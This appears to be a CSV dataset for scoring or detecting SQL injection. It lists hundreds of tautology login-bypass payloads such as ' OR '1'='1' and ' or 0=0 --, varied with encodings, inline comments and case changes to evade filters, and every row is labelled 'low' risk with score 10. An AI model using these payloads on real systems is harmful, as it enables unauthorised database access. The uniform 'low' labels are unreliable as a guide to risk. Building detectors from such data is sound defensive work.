Query,Risk Level,Expected Score
1' OR '1'='1' # BNzEjR,low,10
1' OR '1'='1' -- sVcdN,low,10
1' OR '1'='1' # iCRrdRZljt,low,10
"1""%20OR%20""1""=""1""",low,10
1'%20or%20'1'='1',low,10
1' OR '1'='1' -- uPcwQMpfwI,low,10
1' OR '1'='1' # DHKNE,low,10
1'/**/OR/**/'1'='1'/**/#/**/MySQL/**/comment /* test */,low,10
1' OR '1'='1' -- nokDoQRHt,low,10
1'/**/or/**/'1'='1',low,10
1' OR '1'='1' -- VXQEI -- comment,low,10
1' OR '1'='1' # lvdohcIg,low,10
1'	OR	'1'='1'	--	comment,low,10
1'+or+'1'='1',low,10
1' OR '1'='1' -- lhUVlk,low,10
1' OR '1'='1' /* test */ # MySQL comment,low,10
1' OR '1'='1' # CVFZTNCNPW -- COMMENT,low,10
"1"" OR ""1""=""1""",low,10
1'%20OR%20'1'='1' /* test */,low,10
"1"" OR ""1""=""1"" # MySQL comment",low,10
1'+||+'1'='1',low,10
1'+OR+'1'='1' # MySQL comment,low,10
1' OR '1'='1' -- zZSlUA,low,10
"1""	OR	""1""=""1""",low,10
1' OR '1'='1' -- kHDISbUL,low,10
1'/**/OR/**/'1'='1'/**/#/**/MySQL/**/comment,low,10
1'	OR	'1'='1' # MySQL comment,low,10
1'/**/OR/**/'1'='1' -- comment # MySQL comment,low,10
1'%20OR%20'1'='1' -- NLcrXLwTif,low,10
"1""+OR+""1""=""1""",low,10
1' or '1'='1' # mysql comment,low,10
1' OR '1'='1' # iDNOR,low,10
1' or '1'='1' -- iqGFfh,low,10
1' OR '1'='1' -- lGyTwHGT,low,10
1' OR '1'='1' # MySQL comment # mKYBh,low,10
1' OR '1'='1' -- yfUBayVNF,low,10
1'/**/or/**/'1'='1'/**/#/**/MySQL/**/comment,low,10
1'/**/OR/**/'1'='1' -- comment,low,10
1' OR '1'='1' -- ofYpRnEaJ -- WpIKQJzCAo,low,10
1'%20OR%20'1'='1'%20--%20QiawycY,low,10
1'+OR+'1'='1' -- comment,low,10
1' Or '1'='1' /* test */ -- comment,low,10
1' OR '1'='1' # kGJFKNlz,low,10
1'	OR	'1'='1'	#	MySQL	comment,low,10
1'+OR+'1'='1' # CJgXQagntK # yDSQDYKL,low,10
1' or '1'='1' /* test */,low,10
1'	OR	'1'='1' -- comment,low,10
1' Or '1'='1' # dfGDlLA,low,10
1' OR '1'='1' # HctEME,low,10
"1"" or ""1""=""1"" # zsmcf",low,10
1' OR '1'='1' -- rroHDHqsMQ,low,10
1' OR '1'='1' -- OCpLmw,low,10
1' || '1'='1' -- comment,low,10
1' or '1'='1' -- fJpCyfED # MySQL comment,low,10
1' OR '1'='1' -- KLJDKVVH,low,10
1' or '1'='1' -- WEdVvqVqi,low,10
1'/**/or/**/'1'='1'/**/#/**/mysql/**/comment,low,10
1' or '1'='1' -- NOUXFzZCO,low,10
1' or '1'='1' -- COMMENT,low,10
"1"" OR ""1""=""1"" # ygiqhOCV /* test */",low,10
1' OR '1'='1' # MySQL comment # MySQL comment,low,10
1'  or  '1'='1',low,10
1' OR '1'='1' /* TEST */,low,10
1' OR '1'='1' # MYSQL COMMENT,low,10
1'+Or+'1'='1' # mySQL cOMMent,low,10
1' OR '1'='1' # NlEPUM,low,10
1'%20OR%20'1'='1'%20#%20MySQL%20comment,low,10
1'/**/or/**/'1'='1'/**//*/**/test/**/*/,low,10
1'/**/OR/**/'1'='1'%20--%20comment,low,10
"1""	or	""1""=""1""",low,10
1' || '1'='1' /* test */ -- ZtBVAO,low,10
1'	OR	'1'='1'/**/--/**/HKHOFIX,low,10
1'  oR  '1'='1',low,10
1'	OR	'1'='1'	#	MySQL	comment	#	FKviSNTf,low,10
"1""%20OR%20""1""=""1""%20/*%20TEST%20*/",low,10
"1""%20oR%20""1""=""1""",low,10
1'	OR	'1'='1' /* test */,low,10
1'	||	'1'='1' /* test */,low,10
1' or '1'='1' /* test */ -- LLlOh,low,10
1'+or+'1'='1' /* test */,low,10
1'	or	'1'='1',low,10
1'+or+'1'='1' # MySQL comment,low,10
"1""	OR	""1""=""1"" -- TdnPxvAUyf",low,10
1' or '1'='1' /* TesT */,low,10
1'%20or%20'1'='1'%20--%20COMMENT%20/*%20TEST%20*/,low,10
"1"" || ""1""=""1""",low,10
1' OR '1'='1' -- UbnrT,low,10
1'/**/or/**/'1'='1' /* TEST */,low,10
1' OR '1'='1' -- comment -- comment,low,10
1'+or+'1'='1'+--+NbjGRMQ,low,10
1'+OR+'1'='1'+#+MYSQL+COMMENT+--+QWIthk,low,10
1'+OR+'1'='1' /* test */,low,10
1' Or '1'='1' /* test */,low,10
1' OR '1'='1' /* test */ # JZUFueHKNX,low,10
1' or '1'='1' /* TEST */ -- COMMENT,low,10
1' OR '1'='1' # ikmmKuIYHp,low,10
1' OR '1'='1' # ZICld,low,10
"1""+OR+""1""=""1"" -- WjIyR",low,10
"1"" OR ""1""=""1"" # bYLINioDfN",low,10
1'	OR	'1'='1'	#	MySQL	comment -- comment,low,10
"1"" OR ""1""=""1"" # comment",low,10
1'	or	'1'='1'	--	comment,low,10
"1""	OR	""1""=""1"" # eDRXAkiJA -- ABzeU",low,10
1'++OR++'1'='1' -- comment,low,10
1' OR '1'='1' -- JCzgdZc,low,10
1'  or  '1'='1' # fXmwg,low,10
1' OR '1'='1' # MySQL comment # CtKUNt -- kADZdN,low,10
"1"" OR ""1""=""1"" -- XkoHmRS",low,10
1'	or	'1'='1'	/*	TEST	*/,low,10
"1"" OR ""1""=""1"" # MySQL comment -- comment",low,10
1' || '1'='1' # MySQL comment,low,10
1'/**/or/**/'1'='1'/**/#/**/qECgfbsqP,low,10
"1"" OR ""1""=""1"" -- comment",low,10
"1"" OR ""1""=""1"" -- eXWUKHlsu # dMjKSH",low,10
1'+OR+'1'='1'+--+comment+#+HAUbFnUJi,low,10
1'	OR	'1'='1'	/*	test	*/,low,10
1'%20OR%20'1'='1' -- comment,low,10
1'	Or	'1'='1',low,10
1' OR '1'='1' # cdsPam,low,10
1'%20OR%20'1'='1'%20#%20gqMODaRj,low,10
1' or '1'='1' /* TEST */,low,10
1' OR '1'='1' /* test */ -- lXvHj,low,10
1' OR '1'='1' # QzMGTeSK -- HLOHMg,low,10
1' OR '1'='1' -- OOdOlRyRO,low,10
1'%20OR%20'1'='1'%20#%20MySQL%20comment # TfQSDYR,low,10
1'	or	'1'='1'	#	cxyhrsj,low,10
1' or '1'='1' -- coMMeNt # MySQL comment # tBLjMtUAY -- SBCrNgJd,low,10
1' OR '1'='1' -- aWfaJ /* test */,low,10
1' OR '1'='1' # uLQNSGx,low,10
1'/**//**/or/**//**/'1'='1',low,10
1'	or	'1'='1' /* test */,low,10
1' OR '1'='1' # UlhddzYpS,low,10
1' OR '1'='1' -- COMMENT # SDNXDHBFHR,low,10
1' OR '1'='1' -- KpipuMDVS,low,10
1'/**/OR/**/'1'='1' /* test */,low,10
"1""/**/Or/**/""1""=""1""/**/--/**/cOmMEnt",low,10
1'/**/or/**/'1'='1'  --  PGbvAM,low,10
"1""/**/OR/**/""1""=""1"" # VBKDCRAYn",low,10
1' or '1'='1' # aqycRxFJ /* test */,low,10
1'	OR	'1'='1'	--	SBLcghXniX,low,10
"1"" Or ""1""=""1"" # oaAsWStHqq",low,10
1' or '1'='1' # KANGoXYBDD,low,10
1'%20OR%20'1'='1'/**/#/**/MySQL/**/comment,low,10
1'%20OR%20'1'='1'%20/*%20test%20*/ # MySQL comment,low,10
1'/**/or/**/'1'='1'/**//*/**/TEST/**/*/,low,10
"1"" Or ""1""=""1"" # MySQL comment # GvVFrWXQtm",low,10
1'%20OR%20'1'='1' # VQclSXLdfs,low,10
1'  or  '1'='1' # lgkzFykf,low,10
1' or '1'='1' -- oyzvrpf -- hmhab,low,10
1'/**/OR/**/'1'='1'/**/--/**/COMMENT,low,10
1'	or	'1'='1' # MySQL comment,low,10
1'+or+'1'='1' /* test */ -- txyxEgeRph -- VJqtV,low,10
1'  or  '1'='1'  #  RvLDZheWAL,low,10
1' || '1'='1' # vUSAI -- comment,low,10
"1""/**/OR/**/""1""=""1"" /* test */",low,10
"1"" || ""1""=""1"" /* test */ # MySQL comment",low,10
"1""+OR+""1""=""1""+--+comment",low,10
1'+OR+'1'='1'+--+waZofo+#+ZzUiQ,low,10
1' OR '1'='1' # MYSQL COMMENT # MYSQL COMMENT,low,10
1'	OR	'1'='1'	--	SIJTC -- ZDRBXywlm,low,10
1'/**/or/**/'1'='1'/**//*/**/tESt/**/*/,low,10
"1""/**/||/**/""1""=""1""",low,10
1'	||	'1'='1'	--	comment,low,10
"1""%20OR%20""1""=""1""%20#%20lKtqjTpq%20/*%20test%20*/",low,10
1'  OR  '1'='1' -- GOyJHyjBkP,low,10
1'/**/or/**/'1'='1' # MySQL comment,low,10
1'+Or+'1'='1'+--+hNZTiohjE,low,10
1'/**/||/**/'1'='1' # MySQL comment,low,10
1' OR '1'='1' -- aEzUaodE /* test */ # MySQL comment,low,10
1'	OR	'1'='1'	--	comment	#	MySQL	comment,low,10
1'%20||%20'1'='1'%20/*%20TEST%20*/,low,10
1' || '1'='1' -- AOKazH,low,10
1'%20||%20'1'='1' -- comment,low,10
1'/**/OR/**/'1'='1'/**/--/**/TguvrFMI,low,10
1' || '1'='1' -- MewFp,low,10
"1"" Or ""1""=""1"" -- COMMENT",low,10
1'	Or	'1'='1' -- wzZgMj,low,10
1'+OR+'1'='1' /* test */ -- fuMzCyjrcg,low,10
1'+OR+'1'='1'+#+CrqFLvGU,low,10
1' OR '1'='1' -- COMMENT,low,10
1' || '1'='1' -- MKlhk,low,10
"1"" OR ""1""=""1"" # MYSQL COMMENT /* TEST */",low,10
1'%20OR%20'1'='1'%20--%20CNQkdRFiTX%20#%20FIiLC,low,10
"1"" oR ""1""=""1"" # Mysql COmMeNT",low,10
1'+OR+'1'='1'+#+MySQL+comment,low,10
"1"" OR ""1""=""1"" # FvWGof",low,10
"1""/**/Or/**/""1""=""1""",low,10
1'%20OR%20'1'='1' # yWZMUEVD,low,10
1' OR '1'='1' # eiCGdqG,low,10
1'/**/or/**/'1'='1'/**/--/**/kqbrewxn,low,10
"1""	OR	""1""=""1""	#	MySQL	comment",low,10
1' || '1'='1' # comment,low,10
1' Or '1'='1' /* tesT */,low,10
"1""  OR  ""1""=""1"" # MySQL comment",low,10
1' OR '1'='1' /* test */ # TrThnkp -- comment # MySQL comment /* test */,low,10
1'%20OR%20'1'='1'%20/*%20test%20*/,low,10
1'+OR+'1'='1'+--+EOjmZKx,low,10
"1""+Or+""1""=""1""",low,10
"1"" OR ""1""=""1"" # HECgBw -- iGyAObFHV",low,10
"1""/**/or/**/""1""=""1""/**/#/**/mysql/**/comment",low,10
1' or '1'='1' -- comment -- TUwzWakHP,low,10
"1"" OR ""1""=""1"" -- comment # MySQL comment",low,10
1' OR '1'='1' -- IevdF /* test */,low,10
1'+OR+'1'='1'+/*+TEST+*/,low,10
1' OR '1'='1' -- CmAAwauiA # MySQL comment,low,10
1'	||	'1'='1',low,10
1' OR '1'='1' # caUISEm,low,10
"1""+OR+""1""=""1""+/*+TEST+*/",low,10
1'%20or%20'1'='1' # mYsql COMMENT -- uHbDqoLO,low,10
1'/**/OR/**/'1'='1' /* test */ # WyvsmfG,low,10
"1""%20OR%20""1""=""1""%20--%20comment",low,10
1' OR '1'='1' -- COMMENT -- nKFkU,low,10
1'+OR+'1'='1'+/*+test+*/ -- comment,low,10
"1"" or ""1""=""1"" /* tEST */",low,10
"1""%20or%20""1""=""1"" # bstqqx /* test */",low,10
1'%20OR%20'1'='1'/**/--/**/comment/**/#/**/HNpxX,low,10
1' or '1'='1' # MYSQL cOMmENt,low,10
1'	Or	'1'='1' -- cOMmeNt,low,10
1'+OR+'1'='1'+/*+test+*/+--+comment,low,10
1'%20OR%20'1'='1'%20#%20MySQL%20comment%20#%20lccTpHycxP,low,10
' or 0=0 --,low,10
' oR 0=0 # # MYSQL comMeNt,low,10
' or 0=0 # # QytTLZ,low,10
' OR 0=0 --,low,10
'%20or%200=0%20--,low,10
'+or+0=0+--,low,10
'+OR+0=0+-- # YvyJFGlT,low,10
' or 0=0 #,low,10
' or 0=0 -- -- comment,low,10
'/**/or/**/0=0/**/#,low,10
'+or+0=0+--+--+MKIZA,low,10
'+or+0=0+--+#+uihCcq,low,10
' or 0=0 -- # tuhWfj,low,10
' or 0=0 -- # ricsPZJe,low,10
' oR 0=0 --,low,10
' or 0=0 -- -- comment -- UdeTfQEvqz,low,10
'/**/or/**/0=0/**/--,low,10
' or 0=0 -- # RFwTMzKFvy,low,10
' or 0=0 -- -- WnjmiPHq,low,10
' or 0=0 -- # VHVfVENKh,low,10
' OR 0=0 -- -- PqNFvHeluL,low,10
' or 0=0 -- -- MTSjHdCfVl,low,10
' or 0=0 -- -- myccbf,low,10
""" or 0=0 --",low,10
'%20OR%200=0%20--,low,10
'+OR+0=0+--,low,10
' or 0=0 -- # tqFMJ,low,10
' or 0=0 -- -- gEeBwQcgs,low,10
' OR 0=0 -- -- COMMENT,low,10
' or 0=0 -- /* test */,low,10
' or 0=0 -- # MySQL comment,low,10
'	Or	0=0	--,low,10
' or 0=0 -- -- xDPunFtgZ,low,10
"""+oR+0=0+--",low,10
' or 0=0 -- -- qaPsGg,low,10
'  or  0=0  --,low,10
'+or+0=0+--+--+oPPFLAi,low,10
' OR 0=0 -- -- JoMOk,low,10
' or 0=0 -- # MySQL comment /* test */,low,10
' or 0=0 -- -- NJZDiBqidq,low,10
""" or 0=0 -- -- XGHRvhyGJM",low,10
' oR 0=0 -- # WlmadcK,low,10
' or 0=0 -- -- LahAfUOo,low,10
'	or	0=0	--,low,10
'/**/or/**/0=0/**/--/**//*/**/test/**/*/,low,10
' OR 0=0 -- /* TEST */,low,10
'%20or%200=0%20--%20--%20sZTdIzbNZ%20/*%20test%20*/,low,10
'%20oR%200=0%20--,low,10
'%20or%200=0%20-- # epzeAu,low,10
'/**/OR/**/0=0/**/--,low,10
'/**/or/**/0=0/**/--/**/--/**/GkcZyQrtT,low,10
' or 0=0 -- # mysql comment -- comment,low,10
' oR 0=0 # # PIIPOXEh,low,10
'	or	0=0	--	#	cJwNLoUNBu,low,10
'+or+0=0+#,low,10
' or 0=0 -- -- ZAwCIVEe,low,10
' or 0=0 -- -- nUrtyh,low,10
""" or 0=0 -- # MySQL comment",low,10
' or 0=0 # # comment,low,10
' or 0=0 -- # jyfDhVd,low,10
' or 0=0 -- # mPVgslpmQ -- zyNXA,low,10
'	or	0=0	--	#	nYxrxtz,low,10
'  or  0=0  #,low,10
' or 0=0 -- # Quptuje,low,10
'%20or%200=0%20--	--	comment,low,10
""" or 0=0 -- -- comment",low,10
'+or+0=0+--+/*+test+*/,low,10
'	or	0=0	--	#	MySQL	comment,low,10
'+oR+0=0+--,low,10
"""	or	0=0	--",low,10
' or 0=0 -- # mIIvtlfNh,low,10
'	OR	0=0	--,low,10
' or 0=0 -- -- comment # tHGUh,low,10
'  or  0=0  -- -- comment,low,10
' or 0=0 -- # nxLobrQXEH,low,10
""" or 0=0 -- # mysql comment",low,10
'%20or%200=0%20-- -- comment,low,10
' or 0=0 -- # MDmnAKC,low,10
'	or	0=0	--	--	JawbvUGmFy,low,10
' or 0=0 -- # yOFStN,low,10
' || 0=0 --,low,10
'+or+0=0+--+--+PraNan+#+MySQL+comment,low,10
"""/**/or/**/0=0/**/--",low,10
' or 0=0 # # LVYDvVg,low,10
'/**/or/**/0=0/**/--/**/--/**/GTJjPPh,low,10
'/**/or/**/0=0/**/--/**/#/**/CQeqz,low,10
' or 0=0 -- # jpSLD,low,10
' Or 0=0 --,low,10
' OR 0=0 -- # xksbZ,low,10
'  OR  0=0  --,low,10
'%20OR%200=0%20--%20#%20MySQL%20comment,low,10
' or 0=0 -- # ufNhehpwlQ -- gROUHMtpog,low,10
'+Or+0=0+--+--+comment,low,10
'+or+0=0+--+--+comment,low,10
'+or+0=0+-- /* test */ /* test */,low,10
' or 0=0 -- -- zYeusAi,low,10
"""%20or%200=0%20#",low,10
""" or 0=0 -- # zPWgMa",low,10
' or 0=0 -- -- NBROOQM,low,10
'	or	0=0	--+/*+test+*/+#+MySQL+comment,low,10
'+or+0=0+# # xxvHtkReq,low,10
' OR 0=0 -- -- cOmMEnT -- gmgmX,low,10
"""/**/or/**/0=0/**/#/**/--/**/CBBtIDN # MySQL comment",low,10
'/**/Or/**/0=0/**/--,low,10
""" OR 0=0 -- # MysQl COMmENt",low,10
'+OR+0=0+--+#+MYSQL+COMMENT,low,10
'%20or%200=0%20--%20#%20MySQL%20comment%20--%20comment,low,10
'%20or%200=0%20--+#+MySQL+comment,low,10
' or 0=0 -- /* tESt */,low,10
'	or	0=0	#,low,10
' oR 0=0 -- -- ComMENT -- vCzNWR,low,10
' or 0=0 -- # Uxcqlmk -- wMLXwRtL -- ONOaVIO,low,10
' OR 0=0 -- # MySQL comment,low,10
' or 0=0 -- # oVEoSzg # MySQL comment,low,10
'	oR	0=0	--	--	vvpzFNbcUR,low,10
"""+OR+0=0+--",low,10
'%20or%200=0%20#%20#%20TTpLGqqjuW,low,10
' OR 0=0 #,low,10
""" or 0=0 -- -- KXjAlbTnv",low,10
'%20OR%200=0%20# -- AkCqQxmaZV,low,10
' OR 0=0 -- -- bqMqdKK,low,10
"""%20or%200=0%20#%20/*%20test%20*/",low,10
'/**/or/**/0=0/**/--/**/--/**/comment,low,10
"""%20or%200=0%20--",low,10
""" OR 0=0 --",low,10
'%20or%200=0%20#,low,10
'	or	0=0	-- -- yQWePN -- comment,low,10
'%20or%200=0%20-- # jFXWfUr,low,10
'/**/OR/**/0=0/**/#,low,10
' or 0=0 -- # bPKqBHZ # ofiqgreFC,low,10
"""/**/or/**/0=0/**/#/**/--/**/NghcLnMOny",low,10
'%20OR%200=0%20-- # JLEKL,low,10
""" or 0=0 -- -- zYMfoA /* test */",low,10
' OR 0=0 # # COMMENT,low,10
'	OR	0=0	#,low,10
""" or 0=0 -- /* test */",low,10
'%20or%200=0%20--+--+AzOOxwNHId,low,10
""" Or 0=0 -- /* TESt */",low,10
"""+OR+0=0+--+#+MySQL+comment",low,10
' OR 0=0 -- -- iJQyGukfy,low,10
'/**/OR/**/0=0/**/-- -- COMMENT /* test */,low,10
' Or 0=0 -- /* test */,low,10
""" or 0=0 # /* test */",low,10
'	OR	0=0	-- /* test */,low,10
'%20OR%200=0%20--%20--%20ZRAoibIFlE+#+CzPVfrUkYL,low,10
'+or+0=0+-- # MySQL comment -- comment,low,10
'	OR	0=0	-- # LeFPVJYH,low,10
'/**/or/**/0=0/**/#%20#%20zrTMHnH%20#%20MySQL%20comment,low,10
'	or	0=0	--	#	gnhjKBW,low,10
'%20or%200=0%20-- -- kfxex,low,10
' or 0=0 -- /* test */ -- comment -- YdMGBNrHQ,low,10
'	OR	0=0	-- # MySQL comment,low,10
'%20Or%200=0%20--%20#%20mYsqL%20cOmment,low,10
' OR 0=0 -- -- ISVJV,low,10
"""%20oR%200=0%20--",low,10
'%20or%200=0%20--%20--%20iHmkSg,low,10
'+or+0=0+--+--+Dzypoyi,low,10
' or 0=0 -- # MYsqL commENt # EzQGtP,low,10
' OR 0=0 -- # MySQL comment -- comment -- oTxXp,low,10
""" or 0=0 -- -- JxsLW # MySQL comment",low,10
' OR 0=0 # /* teSt */,low,10
'+or+0=0+-- -- comment,low,10
' OR 0=0 -- -- COMMENT /* test */,low,10
'/**/or/**/0=0/**/--/**//*/**/test/**/*//**//*/**/test/**/*//**/#/**/MySQL/**/comment,low,10
'+or+0=0+#+#+MySQL+comment,low,10
"""  OR  0=0  --",low,10
'	OR	0=0	--	--	comment,low,10
'+or+0=0+--+#+mysql+comment,low,10
' or 0=0 # # bhgmprtc,low,10
' or 0=0 # # MySQL comment # jFUIDgU,low,10
'/**/or/**/0=0/**/--/**/#/**/XqfKqycZ /* test */ /* test */,low,10
'+or+0=0+-- # MySQL comment,low,10
'%20||%200=0%20--,low,10
' || 0=0 #,low,10
' OR 0=0 -- -- QYYHCQN,low,10
'	OR	0=0	-- # mYsql COMMENT,low,10
""" or 0=0 #",low,10
'+OR+0=0+#+#+MySQL+comment,low,10
' oR 0=0 -- -- WTrzdJ # CqGHitzVJ,low,10
'+OR+0=0+-- -- comment,low,10
""" OR 0=0 -- -- KSJKNJAGR",low,10
' OR 0=0 # # MySQL comment,low,10
'	or	0=0	-- -- comment -- comment,low,10
""" or 0=0 -- # xaMWCv -- nptOX",low,10
'/**/OR/**/0=0/**/#/**/--/**/comment,low,10
'%20%20Or%20%200=0%20%20--,low,10
' OR 0=0 -- # YAgjpwTDQ,low,10
'	or	0=0	--	#	MySQL	comment	#	MySQL	comment	#	MySQL	comment,low,10
'/**/or/**/0=0/**/--/**//*/**/test/**/*//**//*/**/test/**/*/,low,10
'	or	0=0	# /* test */,low,10
'+or+0=0+--+#+QLKkgT+/*+test+*/+/*+test+*/ -- qRocSogKC,low,10
'%20or%200=0%20--%20#%20MySQL%20comment,low,10
'+OR+0=0+-- # MYSQL COMMENT,low,10
'%20Or%200=0%20#,low,10
'%20or%200=0%20-- # MySQL comment,low,10
'/**/oR/**/0=0/**/--,low,10
' or 0=0 -- -- pVcTGygCny -- faxnajux,low,10
' or 0=0 -- -- comment # tmfxxhp,low,10
'	oR	0=0	--,low,10
' or 0=0 -- # ujCDS,low,10
'+or+0=0+-- # odqdlo,low,10
'+OR+0=0+#,low,10
'	or	0=0	--	#	mysql	comment,low,10
' OR 0=0 -- # QPFQRKFK # MySQL comment,low,10
'/**/or/**/0=0/**/#/**/--/**/WtSFTOVaTu,low,10
""" or 0=0 -- -- comment -- comment -- RGwkLB",low,10
' or 0=0 -- -- comment -- comment # wkFhA,low,10
'%20OR%200=0%20#,low,10
'+OR+0=0+--	/*	TEST	*/,low,10
' OR 0=0 -- # xpoaxXchh /* test */,low,10
' OR 0=0 -- -- CommeNT,low,10
' or 0=0 # # IqygwhZgt,low,10
' or 0=0 -- -- vuhaherkci # bnzaxhlng,low,10
'%20or%200=0%20--%20--%20TbDxgC,low,10
'+||+0=0+--,low,10
' or 0=0 -- -- QYpThn,low,10
'%20or%200=0%20--%20/*%20test%20*/%20#%20MySQL%20comment%20--%20comment,low,10
"""+or+0=0+--+--+nGzJl /* test */",low,10
'%20or%200=0%20-- # MRoSlET,low,10
"""	OR	0=0	--",low,10
'	oR	0=0	-- /* test */,low,10
' or 0=0 -- -- sVpuNvnS # nMoQuxpVvj -- comment,low,10
'+or+0=0+--+--+syEycXHtD,low,10
' or 0=0 -- # iBmejOHir # MySQL comment,low,10
'/**/or/**/0=0/**/--/**/#/**/MySQL/**/comment/**/--/**/Hnfohj,low,10
' or 0=0 -- -- comment -- comment,low,10
' Or 0=0 -- /* tESt */ # JPMlAY /* test */,low,10
'/**/or/**/0=0/**/--/**/--/**/comment/**/--/**/oYJkRvOR,low,10
"""%20OR%200=0%20#",low,10
'	OR	0=0	--	#	MySQL	comment,low,10
' or 0=0 -- /* test */ -- wnVagN,low,10
'	OR	0=0	-- -- comment,low,10
'+or+0=0+#+#+tfSGb,low,10
'  oR  0=0  --,low,10
'/**/OR/**/0=0/**/-- # MySQL comment,low,10
""" or 0=0 -- # MySQL comment -- comment",low,10
' or 0=0 # # comment # MySQL comment,low,10
'/**/or/**/0=0/**/-- -- mxaewnid,low,10
""" or 0=0 -- -- comment # JietwEAe",low,10
'+oR+0=0+#,low,10
""" OR 0=0 -- -- comment",low,10
""" or 0=0 -- /* test */ # MySQL comment -- QxWofvT",low,10
'+or+0=0+-- # TWnOXbhv,low,10
'%20or%200=0%20--%20#%20WBCVe,low,10
'%20OR%200=0%20-- /* TeSt */,low,10
' or 0=0 -- -- OgkNJdx,low,10
' OR 0=0 -- # mYsql COMMENT,low,10
"""/**/OR/**/0=0/**/--",low,10
"""+or+0=0+-- # PyzabwnXE",low,10
'	or	0=0	--+#+MySQL+comment,low,10
username' OR 1=1;--,low,10
username' OR 1=1;# # MySQL comment,low,10
"username"" OR 1=1;--",low,10
col29' OR 1=1;--,low,10
username' or 1=1;-- # MySQL comment,low,10
username'	OR	1=1;--,low,10
username' OR 1=1;-- -- comment,low,10
tmpc39oi' OR 1=1;--,low,10
username' OR 1=1;-- # xcYvauiGj,low,10
username'/**/OR/**/1=1;--/**/--/**/amnOp,low,10
username'	or	1=1;--,low,10
tmpz0' OR 1=1;#,low,10
username' OR 1=1;-- -- KduwhuY,low,10
username'	OR	1=1;--	#	RYThGfQNZD,low,10
username'/**/OR/**/1=1;--,low,10
username'	OR	1=1;--	/*	test	*/,low,10
USERNAME' or 1=1;-- /* test */,low,10
uSERnaMe' Or 1=1;-- # MySQL comment,low,10
"username""%20OR%201=1;--",low,10
username' OR 1=1;-- /* test */ /* test */,low,10
"username"" OR 1=1;-- # qVzfwnDT",low,10
username'%20OR%201=1;--,low,10
UX' or 1=1;--,low,10
username'/**/or/**/1=1;--,low,10
username' OR 1=1;-- /* test */,low,10
USERNAME' OR 1=1;--,low,10
USERNAME' or 1=1;--,low,10
username'+OR+1=1;--,low,10
username' OR 1=1;-- -- dInyW,low,10
USERNAME'	OR	1=1;--	--	Yqnla,low,10
username' OR 1=1;# # FWkGTe,low,10
username'/**/OR/**/1=1;--/**/--/**/comment/**/--/**/njMzT,low,10
username'	OR	1=1;-- -- comment,low,10
username'	OR	1=1;#,low,10
"username"" OR 1=1;-- -- VeTyvHedXC # KHwrarwcY",low,10
username'%20or%201=1;--,low,10
username' or 1=1;--,low,10
UserNamE' or 1=1;--,low,10
username' || 1=1;--,low,10
username'+OR+1=1;-- # vjGiEFjW -- ESnyuSRGP,low,10
username' OR 1=1;-- # chlIcaoc,low,10
username' or 1=1;-- -- msnyy,low,10
username' || 1=1;-- -- comment,low,10
USERNAME'/**/or/**/1=1;--,low,10
USErnAmE'%20Or%201=1;-- -- ygiUuI,low,10
username' OR 1=1;-- -- uVFoo,low,10
"username"" || 1=1;--",low,10
USERNAME'+OR+1=1;--,low,10
"uSERnAmE"" OR 1=1;--",low,10
username'%20OR%201=1;--  --  fSzEr,low,10
USERnAME'/**/or/**/1=1;--,low,10
username' OR 1=1;#,low,10
USeRNaMe' Or 1=1;--,low,10
USERName' Or 1=1;-- -- cOmMent,low,10
username' OR 1=1;-- -- fjYZxdK,low,10
username' or 1=1;-- # yqlqkuinq,low,10
username' OR 1=1;-- -- IGFRa /* test */,low,10
username'+OR+1=1;--+#+zbXeHlWpFE # MySQL comment,low,10
USERNAME' OR 1=1;-- # MuRnoa,low,10
ztmf'%20OR%201=1;--,low,10
USERNAME'%20or%201=1;--%20/*%20test%20*/,low,10
username' OR 1=1;-- # Opzhv -- comment,low,10
username'/**/OR/**/1=1;#/**/#/**/MySQL/**/comment,low,10
USERNAME' OR 1=1;#,low,10
USERNAME' OR 1=1;# -- comment,low,10
USERNAME' or 1=1;-- # udZjFNPDv,low,10
username'	||	1=1;--	#	VIAobm,low,10
USErnaMe'	oR	1=1;--,low,10
USERNAME'	OR	1=1;--,low,10
username' or 1=1;#,low,10
username'  OR  1=1;--,low,10
USERNAME' or 1=1;-- # mYsql COMMENT,low,10
username'  or  1=1;--,low,10
username' OR 1=1;-- # MySQL comment,low,10
tmplgj'+OR+1=1;--,low,10
vcuf'/**/OR/**/1=1;-- # MySQL comment,low,10
username' OR 1=1;# /* test */,low,10
uSerNaME' oR 1=1;-- -- xvWMffhb,low,10
USERNAME' or 1=1;-- # MySQL comment,low,10
username' OR 1=1;-- # SZXuE,low,10
username'/**/||/**/1=1;--/**/#/**/iHzwyRTMNu,low,10
colk' OR 1=1;-- # MySQL comment # MySQL comment,low,10
yo'/**/OR/**/1=1;--,low,10
username' OR 1=1;-- -- Udmhsz,low,10
